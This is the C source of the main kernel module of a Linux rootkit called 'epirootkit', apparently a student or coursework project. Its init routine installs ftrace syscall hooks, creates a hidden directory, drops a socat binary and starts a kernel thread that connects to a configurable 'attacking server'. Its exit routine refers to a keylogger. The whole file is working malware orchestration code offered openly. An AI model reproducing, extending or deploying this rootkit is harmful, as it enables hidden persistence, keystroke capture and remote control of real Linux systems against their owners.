#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/uaccess.h>

#include "ftrace.h"
#include "epirootkit.h"

struct task_struct *network_thread = NULL;
bool thread_exited = true;
bool restart_on_error = true;

char *ip = SERVER_IP;
int port = SERVER_PORT;
char *message = CONNEXION_MESSAGE;

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "IPv4 of attacking server");
MODULE_PARM_DESC(port, "Port of attacking server");
MODULE_PARM_DESC(message, "Message to send to the attacking server");

/**
 * @brief Initializes the epirootkit module.
 *
 * @return Returns 0 (SUCCESS) on successful initialization, or a negative
 * error code if the kernel thread fails to start.
 */
static int __init epirootkit_init(void) {
    DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");

    // Initalize hooks for the syscall table
    int err;
    err = fh_install_hooks(hooks, hook_array_size);
    if (err) {
        ERR_MSG("epirootkit: epirootkit_init: failed to install hooks\n");
        return err;
    }

    if (create_hidden_tmp_dir() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: failed to create hidden tmp dir\n");
        return -ENOMEM;
    }

    // Init structure for exec_code_stds
    if (init_exec_result() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
        return -ENOMEM;
    }

    if (drop_socat_binaire() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
        return -FAILURE;
    }

    // Start a kernel thread that will handle network communication
    thread_exited = false;
    network_thread = kthread_run(network_worker, NULL, "netcom_thread");
    if (IS_ERR(network_thread)) {
        ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
        thread_exited = true;
        return PTR_ERR(network_thread);
    }

    return SUCCESS;
}

/**
 * @brief Cleanup function called when the module is unloaded.
 *
 * This function is executed during the module's exit phase.
 */
static void __exit epirootkit_exit(void) {
    remove_socat_binaire();

    // stop keylogger
    epikeylog_exit();

    free_exec_result();

    if (network_thread) {
        if (!thread_exited)
            kthread_stop(network_thread);
        thread_exited = true;
        network_thread = NULL;
        DBG_MSG("epirootkit: close_thread: thread stopped\n");
    }

    // Remove the hidden directory
    if (remove_hidden_tmp_dir() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
    }

    close_socket();

    // Remove hooks from the syscall table
    fh_remove_hooks(hooks, hook_array_size);

    DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");